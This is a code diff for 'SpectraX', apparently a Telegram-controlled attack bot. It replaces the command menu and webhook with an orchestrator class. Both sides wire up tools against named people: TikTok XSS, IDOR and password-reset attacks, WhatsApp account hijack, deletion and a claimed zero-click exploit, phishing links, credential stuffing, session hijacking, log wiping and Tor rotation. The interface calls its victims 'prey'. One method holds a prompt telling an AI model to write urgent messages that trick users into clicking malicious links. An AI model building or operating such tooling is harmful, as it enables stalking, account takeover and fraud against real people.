@@ -1,382 +1,353 @@
-import os
 import json
-import requests
+import logging
 import threading
-import difflib
-from flask import Flask, request, jsonify
-from orchestrator import Orchestrator
-from config import TELEGRAM_TOKEN, SUPER_ADMIN_ID
+from modules.ai_analysis import AIAnalyzer
+from modules.osint import OSINTEngine
+from modules.analysis import Analyzer
+from modules.tiktok_xss_csrf import TikTokXSS_CSRF
+from modules.tiktok_idor_delete import TikTokIDORDelete
+from modules.tiktok_sms_spoof import TikTokSMSSpoof
+from modules.wa_zero_click import WhatsAppZeroClickRCE
+from modules.wa_delivery_fingerprint import WaDeliveryFingerprint
+from modules.verification import Verify
+from modules.utils import db_insert_target, db_get_target, db_update_target_profile, db_log_attack, db_list_targets, db_log_diagnostic
+from config import TIKTOK_SESSION, SMS_GATEWAY_API_KEY, SMS_GATEWAY_URL, VIRUSTOTAL_API_KEY, ENABLE_SCHEDULER
+from plugins import load_plugins
 
-app = Flask(__name__)
-orch = Orchestrator()
-TELEGRAM_API = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
+# New attack modules
+from modules.wa_real_attack import WaRealAttack
+from modules.wa_delete import delete_whatsapp_account
+from modules.wa_hijack import hijack_whatsapp
+from modules.wa_deactivate import request_deactivation
+from modules.wa_selenium_sender import WaSeleniumSender
+from modules.tiktok_real_attack import TikTokRealAttack
+from modules.tt_delete import delete_tiktok_account
+from modules.tt_reset_hijack import reset_tiktok_password
+from modules.tt_report import report_tiktok_account
 
-# ---------- Alias mapping ----------
-COMMAND_ALIASES = {
-    '/start': ['/start', '❓ help', 'help', '/menu'],
-    '/track': ['/track', '🔍 track', 'track', '☠️ hunt'],
-    '/retrieve': ['/retrieve'],
-    '/analyze': ['/analyze', '📊 analyze', 'analyze', '💀 slaughter'],
-    '/hack_tiktok': ['/hack_tiktok', '🎯 hack tiktok', 'hack tiktok', '🔥 assassinate'],
-    '/hack_wa': ['/hack_wa', '📱 hack whatsapp', 'hack whatsapp', '⚡ terminate'],
-    '/verify': ['/verify', '✅ verify', 'verify'],
-    '/list': ['/list', '📋 list', 'list', '📋 prey list'],
-    '/breach': ['/breach'],
-    '/whois': ['/whois'],
-    '/dns': ['/dns'],
-    '/reverseimage': ['/reverseimage'],
-    '/phish': ['/phish'],
-    '/stuff': ['/stuff'],
-    '/session': ['/session'],
-    '/report': ['/report'],
-    '/virustotal': ['/virustotal'],
-    '/nmap': ['/nmap'],
-    '/instagram': ['/instagram', '🌐 stalk instagram'],
-    '/twitter': ['/twitter', '🐦 stalk twitter'],
-    '/diagnose': ['/diagnose', '🛡️ diagnostics'],
-    '/model': ['/model'],
-    '/add_admin': ['/add_admin'],
-    '/remove_admin': ['/remove_admin'],
-    '/list_admins': ['/list_admins'],
-    '/sentiment': ['/sentiment'],
-    '/phish_link': ['/phish_link'],
-    '/plugin_list': ['/plugin_list'],
-    '/plugin_load': ['/plugin_load'],
-    '/monitor': ['/monitor'],
-    '/record_outcome': ['/record_outcome'],
-    '/best_attack': ['/best_attack'],
-    '/defensive': ['/defensive'],
-    '/share': ['/share'],
-    '/unshare': ['/unshare'],
-    '/shodan': ['/shodan'],
-    '/encrypt': ['/encrypt'],
-    '/decrypt': ['/decrypt'],
-    '/geolocate': ['/geolocate'],
-    '/darkweb': ['/darkweb'],
-    '/score': ['/score'],
-    '/wa_send': ['/wa_send'],
-    '/wa_call': ['/wa_call'],
-    '/wa_delete': ['/wa_delete'],
-    '/wa_hijack': ['/wa_hijack'],
-    '/wa_deactivate': ['/wa_deactivate'],
-    '/tt_comment': ['/tt_comment'],
-    '/tt_reset': ['/tt_reset'],
-    '/tt_follow': ['/tt_follow'],
-    '/tt_delete': ['/tt_delete'],
-    '/tt_report': ['/tt_report'],
-    '/wipe_target': ['/wipe_target'],
-    '/ransom': ['/ransom'],
-    '/panic': ['/panic'],
-    '/anonymize': ['/anonymize'],
-}
+# Existing advanced modules
+from modules.advanced_osint import AdvancedOSINT
+from modules.advanced_attacks import AdvancedAttacks
+from modules.reporting import ReportGenerator
+from modules.threat_intel import ThreatIntel
+from modules.social_media import SocialMedia
+from modules.wizard import Wizard
+from modules.admin_manager import AdminManager
+from modules.diagnostics import Diagnostics
+from modules.scheduler import start_scheduler
+from modules.sentiment import SentimentAnalyzer
+from modules.phishing import create_tracking_link
+from modules.plugin_manager import fetch_plugins, load_plugin
+from modules.monitor import monitor_target
+from modules.learner import Learner
+from modules.defensive import check_api_keys_exposure
+from modules.collab import Collaboration
+from modules.external import shodan_lookup
+from modules.crypto import encrypt, decrypt
+from modules.geolocation import get_location
+from modules.darkweb import search_breaches
+from modules.scoring import calculate_score
 
-def get_command(text):
-    text_lower = text.strip().lower()
-    for canonical, aliases in COMMAND_ALIASES.items():
-        if text_lower in [a.lower() for a in aliases]:
-            return canonical
-    all_aliases = [item for sublist in COMMAND_ALIASES.values() for item in sublist]
-    matches = difflib.get_close_matches(text_lower, all_aliases, n=1, cutoff=0.6)
-    if matches:
-        for canonical, aliases in COMMAND_ALIASES.items():
-            if matches[0] in [a.lower() for a in aliases]:
-                return canonical
-    return None
+logger = logging.getLogger(__name__)
 
-# ---------- Helpers ----------
-def send_typing(chat_id):
-    try:
-        requests.post(f"{TELEGRAM_API}/sendChatAction",
-                      json={"chat_id": chat_id, "action": "typing"},
-                      timeout=5)
-    except Exception:
-        pass
+class Orchestrator:
+    def __init__(self):
+        self.ai = AIAnalyzer(self)
+        self.osint = OSINTEngine()
+        self._retriever = None
+        self.tiktok_xss = TikTokXSS_CSRF()
+        self.tiktok_idor = TikTokIDORDelete(TIKTOK_SESSION, '123456') if TIKTOK_SESSION else None
+        self.tiktok_sms = TikTokSMSSpoof(SMS_GATEWAY_API_KEY, SMS_GATEWAY_URL) if SMS_GATEWAY_API_KEY else None
+        self.wa_rce = WhatsAppZeroClickRCE()
+        self.wa_fp = WaDeliveryFingerprint()
+        self.verifier = Verify()
+        self.plugins = load_plugins(self)
 
-def send_message(chat_id, text, parse_mode='HTML', reply_markup=None):
-    payload = {
-        'chat_id': chat_id,
-        'text': text[:4096],
-        'parse_mode': parse_mode
-    }
-    if reply_markup:
-        payload['reply_markup'] = json.dumps(reply_markup)
-    try:
-        requests.post(f"{TELEGRAM_API}/sendMessage", json=payload, timeout=10)
-    except Exception as e:
-        print(f"Send failed: {e}")
+        # New attack modules
+        self.wa_real = WaRealAttack()
+        self.wa_sender = WaSeleniumSender(profile_dir='/app/whatsapp-profile')
+        self.tiktok_real = TikTokRealAttack(TIKTOK_SESSION) if TIKTOK_SESSION else None
 
-def send_formatted_message(chat_id, text, parse_mode='HTML', reply_markup=None):
-    header = "☠️ **SPECTRAX**\n━━━━━━━━━━━━━━━━━━━━\n"
-    footer = "\n━━━━━━━━━━━━━━━━━━━━\n⚡"
-    full_text = header + text + footer
-    replacements = {
-        'analysis': 'slaughter',
-        'tracking': 'hunting',
-        'attack': 'assassination',
-        'target': 'prey',
-        'success': 'termination',
-        'error': 'malfunction'
-    }
-    for old, new in replacements.items():
-        full_text = full_text.replace(old, new)
-    send_message(chat_id, full_text, parse_mode, reply_markup)
+        # Existing advanced features
+        self.adv_osint = AdvancedOSINT()
+        self.adv_attacks = AdvancedAttacks()
+        self.report = ReportGenerator()
+        self.threat = ThreatIntel()
+        self.social = SocialMedia()
+        self.wizard = Wizard()
+        self.admin = AdminManager()
+        self.diagnostics = Diagnostics()
+        self.sentiment = SentimentAnalyzer()
+        self.collab = Collaboration()
+        self.learner = Learner()
 
-def process_long_task(chat_id, func, *args, **kwargs):
-    def wrapper():
-        try:
-            result = func(*args, **kwargs)
-            if result is None:
-                result = {'success': False, 'output': 'No result returned.'}
-            def default_serializer(obj):
-                if hasattr(obj, 'isoformat'):
-                    return obj.isoformat()
-                raise TypeError(f"Object of type {type(obj)} is not JSON serializable")
-            send_formatted_message(chat_id, json.dumps(result, indent=2, default=default_serializer))
-        except Exception as e:
-            send_formatted_message(chat_id, f"⚠️ <b>Malfunction:</b> {str(e)}")
-    thread = threading.Thread(target=wrapper)
-    thread.daemon = True
-    thread.start()
+        if ENABLE_SCHEDULER:
+            start_scheduler()
 
-def get_main_keyboard():
-    return {
-        "keyboard": [
-            ["☠️ Hunt", "💀 Slaughter"],
-            ["🔥 Assassinate", "⚡ Terminate"],
-            ["📋 Prey List", "✅ Verify Kill"],
-            ["🛡️ Diagnostics", "📄 Execution Report"],
-            ["🌐 Stalk Instagram", "🐦 Stalk Twitter"],
-            ["❓ Help – Despair"]
-        ],
-        "resize_keyboard": True,
-        "one_time_keyboard": False
-    }
+    @property
+    def retriever(self):
+        if self._retriever is None:
+            try:
+                from modules.retrieval import ProfileRetriever
+                self._retriever = ProfileRetriever()
+            except Exception as e:
+                logger.error(f"ProfileRetriever init failed: {e}")
+                self._retriever = None
+        return self._retriever
 
-def is_admin(chat_id):
-    return chat_id == SUPER_ADMIN_ID or orch.admin.is_admin(chat_id)
-
-def get_help_text():
-    return """
-<b>☠️ SpectraX</b>
-
-<b>🔵 Reconnaissance</b>
-/track &lt;identifier&gt; – OSINT on username/email/phone
-/retrieve &lt;tid&gt; &lt;platform&gt; – Retrieve profile (TikTok)
-/breach &lt;email&gt; – Check data breaches
-/whois &lt;domain&gt; – WHOIS lookup
-/dns &lt;domain&gt; – DNS resolution
-/reverseimage &lt;url&gt; – Reverse image search
-/instagram &lt;username&gt; – Instagram profile
-/twitter &lt;username&gt; – Twitter profile
-/geolocate &lt;ip&gt; – IP geolocation
-/darkweb &lt;email&gt; – Breach check
-
-<b>🔴 Assassinations</b>
-/hack_tiktok &lt;user&gt; &lt;email&gt; – XSS + IDOR (admin)
-/hack_wa &lt;phone&gt; – WhatsApp registration check (admin)
-/wa_send &lt;phone&gt; &lt;message&gt; – Send real WhatsApp message (admin)
-/wa_call &lt;phone&gt; – Initiate WhatsApp call (admin)
-/wa_delete &lt;session&gt; – Delete WhatsApp account (admin)
-/wa_hijack &lt;phone&gt; &lt;code&gt; – Hijack WhatsApp (admin)
-/wa_deactivate &lt;phone&gt; – Send deactivation request (admin)
-/tt_comment &lt;video_id&gt; &lt;comment&gt; – Post XSS comment (admin)
-/tt_reset &lt;username&gt; &lt;email&gt; – Trigger password reset (admin)
-/tt_follow &lt;username&gt; – Follow target (admin)
-/tt_delete &lt;session&gt; &lt;user_id&gt; – Delete TikTok account (admin)
-/tt_report &lt;session&gt; &lt;username&gt; – Report TikTok account (admin)
-/phish &lt;email&gt; [template] – Generate phishing email (admin)
-/phish_link &lt;email&gt; – Shorten phishing link (admin)
-/stuff &lt;user&gt; &lt;passwords&gt; – Credential stuffing (admin)
-/session &lt;cookie&gt; – Test session cookie (admin)
-/nmap &lt;host&gt; [ports] – Port scan (admin)
-
-<b>🟢 Analysis</b>
-/analyze &lt;tid&gt; – Risk report
-/report &lt;tid&gt; – Generate PDF report
-/sentiment &lt;text&gt; – Sentiment analysis
-/score &lt;tid&gt; – Target priority score
-/best_attack &lt;tid&gt; – Best attack from past outcomes
-
-<b>🟣 Utilities</b>
-/list – Show all targets
-/verify &lt;tid&gt; &lt;platform&gt; – Verify platform presence
-/encrypt &lt;text&gt; – Encrypt text
-/decrypt &lt;encrypted&gt; – Decrypt text
-/wipe_target &lt;tid&gt; – Delete target and all traces (admin)
-/ransom – Simulate ransom note (admin)
-/panic – Clear all logs (admin)
-/anonymize – Refresh Tor identity (admin)
-
-<b>⚙️ Admin & System</b>
-/diagnose – System diagnostics
-/model &lt;provider&gt; – Switch AI (groq/gemini/deepseek/ollama)
-/add_admin &lt;user_id&gt; – Add admin (super admin)
-/remove_admin &lt;user_id&gt; – Remove admin (super admin)
-/list_admins – List admins (super admin)
-/defensive – Scan for exposed keys (admin)
-/monitor &lt;tid&gt; &lt;chat_id&gt; – Start monitoring (admin)
-/record_outcome &lt;tid&gt; &lt;attack&gt; &lt;success&gt; – Record outcome
-/share &lt;tid&gt; &lt;user_id&gt; – Share target
-/unshare &lt;tid&gt; &lt;user_id&gt; – Unshare target
-/plugin_list – List available plugins
-/plugin_load &lt;name&gt; – Load plugin
-
-📌 <i>Use /start to see this menu anytime.</i>
-"""
-
-# ---------- Routes ----------
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    data = request.get_json()
-    if not data:
-        return 'OK', 200
-
-    if 'callback_query' in data:
-        return 'OK', 200
-
-    if 'message' not in data:
-        return 'OK', 200
-
-    msg = data['message']
-    chat_id = msg['chat']['id']
-    text = msg.get('text', '').strip()
-    if not text:
-        return 'OK', 200
-
-    send_typing(chat_id)
-
-    cmd = get_command(text)
-    if cmd is None:
-        if text.startswith('/'):
-            cmd = text.split()[0].lower()
+    # ---------- Core Methods ----------
+    def track(self, identifier):
+        if '@' in identifier:
+            res = self.osint.scan_email(identifier)
         else:
-            send_formatted_message(chat_id, "❓ Unknown command. Type <code>/start</code> or <code>/menu</code> for help.")
-            return 'OK', 200
+            res = self.osint.scan_username(identifier)
+        target_id = db_insert_target(identifier, 'auto', res)
+        target_data = {'identifier': identifier, 'osint': res}
+        ai_result = self.ai.analyze_and_act(target_id, target_data)
+        return {'target_id': target_id, 'osint': res, 'ai_action': ai_result}
 
-    parts = text.split()
-    args = parts[1:] if len(parts) > 1 else []
+    def retrieve(self, target_id, platform):
+        if self.retriever is None:
+            return {'error': 'Retrieval module unavailable (Chrome missing).'}
+        target = db_get_target(target_id)
+        if not target:
+            return {'error': 'Target not found'}
+        if platform.lower() == 'tiktok':
+            try:
+                profile = self.retriever.get_tiktok_profile(target['identifier'])
+                if profile:
+                    db_update_target_profile(target_id, profile)
+                    return profile
+                return {'error': 'Profile retrieval failed'}
+            except Exception as e:
+                return {'error': f'Scraping error: {str(e)}'}
+        return {'error': 'Unsupported platform'}
 
-    try:
-        # ---------- Core Commands ----------
-        if cmd == '/start' or cmd == '/menu':
-            reply = get_help_text()
-            send_formatted_message(chat_id, reply, reply_markup=get_main_keyboard())
+    def analyze(self, target_id):
+        target = db_get_target(target_id)
+        if not target:
+            return {'error': 'Target not found'}
+        return Analyzer.generate_report(target_id, target.get('osint', {}), target.get('profile', {}))
 
-        elif cmd == '/track':
-            if not args:
-                reply = "❌ Usage: <code>/track &lt;identifier&gt;</code>\nExample: <code>/track john_doe</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                ident = args[0]
-                send_formatted_message(chat_id, "⏳ Hunting... Please wait.")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.track, ident)).start()
+    def hack_tiktok(self, username, email):
+        xss = self.tiktok_xss.exploit(username, email)
+        idor = self.tiktok_idor.exploit('TARGET_ACCOUNT_ID') if self.tiktok_idor else None
+        return {'xss': xss, 'idor': idor}
 
-        elif cmd == '/retrieve':
-            if len(args) < 2:
-                reply = "❌ Usage: <code>/retrieve &lt;target_id&gt; &lt;platform&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                try:
-                    tid = int(args[0])
-                    plat = args[1]
-                    send_formatted_message(chat_id, f"⏳ Retrieving from {plat}...")
-                    threading.Thread(target=process_long_task, args=(chat_id, orch.retrieve, tid, plat)).start()
-                except ValueError:
-                    send_formatted_message(chat_id, "❌ Invalid target ID. Must be a number.")
+    def hack_whatsapp(self, phone):
+        try:
+            rce = self.wa_rce.exploit(phone)
+            fp = self.wa_fp.exploit(phone)
+            return {'rce': rce, 'fingerprint': fp}
+        except Exception as e:
+            return {'error': str(e)}
 
-        elif cmd == '/analyze':
-            if not args or not args[0].isdigit():
-                reply = "❌ Usage: <code>/analyze &lt;target_id&gt;</code>\nExample: <code>/analyze 5</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                tid = int(args[0])
-                send_formatted_message(chat_id, f"⏳ Slaughtering analysis...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.analyze, tid)).start()
+    def verify_target(self, target_id, platform):
+        target = db_get_target(target_id)
+        if not target:
+            return {'error': 'Target not found'}
+        if platform.lower() == 'whatsapp':
+            return self.verifier.check_whatsapp_registration(target['identifier'])
+        return {'success': False, 'output': 'Platform not supported'}
 
-        elif cmd == '/hack_tiktok':
-            if not is_admin(chat_id):
-                send_formatted_message(chat_id, "⛔ Admin only.")
-            elif len(args) < 2:
-                reply = "❌ Usage: <code>/hack_tiktok &lt;username&gt; &lt;attacker_email&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                username, email = args[0], args[1]
-                send_formatted_message(chat_id, f"⏳ Launching assassination on {username}...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_tiktok, username, email)).start()
+    def log_attack(self, target_id, attack_type, result):
+        db_log_attack(target_id, attack_type, result)
 
-        elif cmd == '/hack_wa':
-            if not is_admin(chat_id):
-                send_formatted_message(chat_id, "⛔ Admin only.")
-            elif not args:
-                reply = "❌ Usage: <code>/hack_wa &lt;phone&gt;</code>\nExample: <code>/hack_wa +2348012345678</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                phone = args[0]
-                send_formatted_message(chat_id, f"⏳ Checking prey for WhatsApp...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.hack_whatsapp, phone)).start()
+    def list_targets(self):
+        return db_list_targets()
 
-        elif cmd == '/verify':
-            if len(args) < 2:
-                reply = "❌ Usage: <code>/verify &lt;target_id&gt; &lt;platform&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                try:
-                    tid = int(args[0])
-                    plat = args[1]
-                    send_formatted_message(chat_id, f"⏳ Verifying...")
-                    threading.Thread(target=process_long_task, args=(chat_id, orch.verify_target, tid, plat)).start()
-                except ValueError:
-                    send_formatted_message(chat_id, "❌ Invalid target ID.")
+    def social_engineer(self, params):
+        target_info = params.get('target_info', '')
+        if self.ai and self.ai.ai_manager:
+            try:
+                prompt = f"Generate a convincing SMS or email to trick a user into clicking a malicious link. Target info: {target_info}. Keep it short and urgent."
+                response = self.ai.ai_manager.generate(prompt, max_tokens=100, temperature=0.7)
+                return {'success': True, 'output': response}
+            except Exception as e:
+                return {'success': False, 'output': f'AI generation failed: {e}'}
+        else:
+            return {
+                'success': True,
+                'output': f"Hi, this is support. We need to verify your account. Please click: http://phishing.link"
+            }
 
-        elif cmd == '/list':
-            send_formatted_message(chat_id, "⏳ Fetching prey list...")
-            threading.Thread(target=process_long_task, args=(chat_id, orch.list_targets)).start()
+    # ---------- Advanced OSINT & Reconnaissance ----------
+    def breach_check(self, email):
+        return self.adv_osint.email_breach(email)
 
-        # ---------- OSINT Commands ----------
-        elif cmd == '/breach':
-            if not args:
-                reply = "❌ Usage: <code>/breach &lt;email&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                email = args[0]
-                send_formatted_message(chat_id, f"⏳ Checking breach for {email}...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.breach_check, email)).start()
+    def whois_lookup(self, domain):
+        return self.adv_osint.whois_lookup(domain)
 
-        elif cmd == '/whois':
-            if not args:
-                reply = "❌ Usage: <code>/whois &lt;domain&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                domain = args[0]
-                send_formatted_message(chat_id, f"⏳ WHOIS lookup...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.whois_lookup, domain)).start()
+    def dns_enum(self, domain):
+        return self.adv_osint.dns_enum(domain)
 
-        elif cmd == '/dns':
-            if not args:
-                reply = "❌ Usage: <code>/dns &lt;domain&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                domain = args[0]
-                send_formatted_message(chat_id, f"⏳ DNS resolution...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.dns_enum, domain)).start()
+    def reverse_image(self, image_url):
+        return self.adv_osint.reverse_image_search(image_url)
 
-        elif cmd == '/reverseimage':
-            if not args:
-                reply = "❌ Usage: <code>/reverseimage &lt;image_url&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                url = args[0]
-                send_formatted_message(chat_id, f"⏳ Reverse image search...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.reverse_image, url)).start()
+    def instagram_profile(self, username):
+        return self.social.get_instagram_profile(username)
 
-        elif cmd == '/instagram':
-            if not args:
-                reply = "❌ Usage: <code>/instagram &lt;username&gt;</code>"
-                send_formatted_message(chat_id, reply)
-            else:
-                username = args[0]
-                send_formatted_message(chat_id, f"⏳ Stalking Instagram...")
-                threading.Thread(target=process_long_task, args=(chat_id, orch.instagram_profile, username)).start()
+    def twitter_profile(self, username):
+        return self.social.get_twitter_profile(username)
 
-        elif cmd == '/twitter':
-            if not args:
+    # ---------- Advanced Attacks ----------
+    def generate_phish(self, email, template='generic'):
+        return self.adv_attacks.phishing_email(email, template)
+
+    def credential_stuff(self, username, password_list):
+        return self.adv_attacks.credential_stuffing(username, password_list)
+
+    def session_hijack(self, cookie):
+        return self.adv_attacks.session_hijacking(cookie)
+
+    def nmap_scan(self, host, ports='1-1024'):
+        return self.threat.nmap_scan(host, ports)
+
+    def virustotal_ip(self, ip):
+        return self.threat.virustotal_ip(ip, VIRUSTOTAL_API_KEY)
+
+    # ---------- Reporting & Analysis ----------
+    def generate_report_pdf(self, target_id):
+        target = db_get_target(target_id)
+        if not target:
+            return {'error': 'Target not found'}
+        data = {
+            'id': target['id'],
+            'identifier': target['identifier'],
+            'platform': target['platform'],
+            'osint': target.get('osint', {}),
+            'profile': target.get('profile', {}),
+            'created': target.get('created_at')
+        }
+        return self.report.generate_pdf(data)
+
+    def sentiment_analysis(self, text):
+        return self.sentiment.analyze(text)
+
+    def score_target(self, target_id):
+        target = db_get_target(target_id)
+        if not target:
+            return {'error': 'Target not found'}
+        score = calculate_score(target.get('osint', {}))
+        return {'target_id': target_id, 'score': score}
+
+    # ---------- Phishing Link ----------
+    def create_phishing_link(self, email):
+        return create_tracking_link(email)
+
+    # ---------- Geolocation ----------
+    def geolocate_ip(self, ip):
+        return get_location(ip)
+
+    # ---------- Encryption ----------
+    def encrypt_data(self, data):
+        return encrypt(data)
+
+    def decrypt_data(self, data):
+        return decrypt(data)
+
+    # ---------- Dark Web ----------
+    def darkweb_search(self, email):
+        return search_breaches(email)
+
+    # ---------- Shodan ----------
+    def shodan_ip(self, ip):
+        return shodan_lookup(ip)
+
+    # ---------- WhatsApp Real Attacks ----------
+    def send_wa_message(self, phone, message):
+        return self.wa_sender.send_message(phone, message)
+
+    def hack_wa_call(self, phone):
+        return self.wa_real.call_number(phone)
+
+    def wa_delete(self, session_cookie):
+        return delete_whatsapp_account(session_cookie)
+
+    def wa_hijack(self, phone, code):
+        return hijack_whatsapp(phone, code)
+
+    def wa_deactivate(self, phone):
+        return request_deactivation(phone)
+
+    # ---------- TikTok Real Attacks ----------
+    def hack_tiktok_comment(self, video_id, comment):
+        if self.tiktok_real:
+            return self.tiktok_real.post_comment(video_id, comment)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def hack_tiktok_reset(self, username, email):
+        if self.tiktok_real:
+            return self.tiktok_real.trigger_password_reset(username, email)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def hack_tiktok_follow(self, target_username):
+        if self.tiktok_real:
+            return self.tiktok_real.follow_target(target_username)
+        return {'success': False, 'output': 'TikTok session not available.'}
+
+    def tt_delete(self, session_cookie, user_id):
+        return delete_tiktok_account(session_cookie, user_id)
+
+    def tt_reset(self, session_cookie, new_password):
+        return reset_tiktok_password(session_cookie, new_password)
+
+    def tt_report(self, session_cookie, username):
+        return report_tiktok_account(session_cookie, username)
+
+    # ---------- Anonymize (Tor) ----------
+    def anonymize(self):
+        try:
+            import stem
+            from stem.control import Controller
+            with Controller.from_port(port=9051) as controller:
+                controller.authenticate()
+                controller.signal(stem.Signal.NEWNYM)
+            return {'success': True, 'output': 'Tor identity refreshed.'}
+        except ImportError:
+            return {'success': False, 'output': 'Stem library not installed.'}
+        except Exception as e:
+            return {'success': False, 'output': str(e)}
+
+    # ---------- Monitoring ----------
+    def start_monitor(self, target_id, chat_id, send_func):
+        threading.Thread(target=monitor_target, args=(target_id, chat_id, send_func), daemon=True).start()
+
+    # ---------- Self-learning ----------
+    def record_outcome(self, target_id, attack, success):
+        self.learner.record_outcome(target_id, attack, success)
+
+    def get_best_attack(self, target_id):
+        return self.learner.get_best_attack(target_id)
+
+    # ---------- Defensive ----------
+    def defensive_scan(self):
+        return check_api_keys_exposure()
+
+    # ---------- Collaboration ----------
+    def share_target(self, target_id, user_id):
+        self.collab.share_target(target_id, user_id)
+
+    def unshare_target(self, target_id, user_id):
+        self.collab.unshare_target(target_id, user_id)
+
+    # ---------- Plugins ----------
+    def fetch_plugins(self):
+        return fetch_plugins()
+
+    def load_plugin(self, name):
+        return load_plugin(name)
+
+    # ---------- Diagnostics ----------
+    def run_diagnostics(self):
+        results = self.diagnostics.run_all()
+        for name, result in results.items():
+            db_log_diagnostic(name, result.get('status', 'UNKNOWN'), result)
+        return results
+
+    # ---------- Switch AI ----------
+    def switch_ai_model(self, provider):
+        if hasattr(self.ai, 'ai_manager'):
+            self.ai.ai_manager.set_active_provider(provider)
+            return {'success': True, 'message': f'Switched to {provider}'}
+        return {'success': False, 'error': 'AI manager not available'}
